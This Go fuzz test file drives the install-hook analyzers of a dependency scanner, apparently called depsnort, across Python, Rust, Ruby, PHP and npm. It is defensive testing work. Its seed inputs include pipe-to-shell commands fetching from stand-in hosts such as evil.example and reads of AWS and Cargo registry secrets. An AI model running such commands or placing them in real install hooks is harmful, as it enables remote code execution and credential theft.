package installsurface

import "testing"

// The install-surface analyzers are regex-heavy and read attacker-authored hook
// source by design — the single most attacker-facing code path in depsnort that
// is not a lockfile parser. These targets drive each ecosystem's analyzer with
// arbitrary "source" and assert it terminates without panicking (D-33).

func FuzzAnalyzePython(f *testing.F) {
	f.Add("import os\nos.system('curl x | sh')", "[build-system]\nrequires=['setuptools']")
	f.Add("from setuptools import setup\nsetup(cmdclass={'install': X})", "")
	f.Add("__import__('os').environ['AWS_SECRET_ACCESS_KEY']", "")
	f.Add("", "")

	f.Fuzz(func(t *testing.T, setupPy, pyproject string) {
		s := AnalyzePython(setupPy, pyproject, map[string]string{"a.pth": setupPy})
		_ = s.Hooks
	})
}

func FuzzAnalyzeRust(f *testing.F) {
	f.Add(`use std::process::Command; fn main(){ Command::new("sh").arg("-c"); }`)
	f.Add(`fn main(){ std::env::var("CARGO_REGISTRY_TOKEN"); }`)
	f.Add("")

	f.Fuzz(func(t *testing.T, buildRs string) {
		s := AnalyzeRust(buildRs)
		_ = s.Hooks
	})
}

func FuzzAnalyzeRuby(f *testing.F) {
	f.Add(`require 'net/http'; system("curl evil | sh")`, `Gem::Specification.new`)
	f.Add("", "")

	f.Fuzz(func(t *testing.T, extconf, gemspec string) {
		s := AnalyzeRuby(extconf, gemspec)
		_ = s.Hooks
	})
}

func FuzzAnalyzePHP(f *testing.F) {
	f.Add("curl https://x | sh", "composer-plugin", "<?php class P { public function activate(){} }")
	f.Add("", "library", "")

	f.Fuzz(func(t *testing.T, script, pkgType, pluginSource string) {
		s := AnalyzePHP(map[string]string{"post-install-cmd": script}, pkgType, pluginSource)
		_ = s.Hooks
	})
}

func FuzzAnalyzeNpm(f *testing.F) {
	f.Add("node -e \"require('https').get('https://evil/x')\"")
	f.Add("curl https://evil.example/p.sh | sh")
	f.Add("")

	f.Fuzz(func(t *testing.T, script string) {
		// A reader that always fails: the analyzer must handle unreadable
		// references without assuming content is available.
		s := Analyze(map[string]string{"postinstall": script},
			func(string) ([]byte, bool) { return nil, false })
		_ = s.Hooks
	})
}
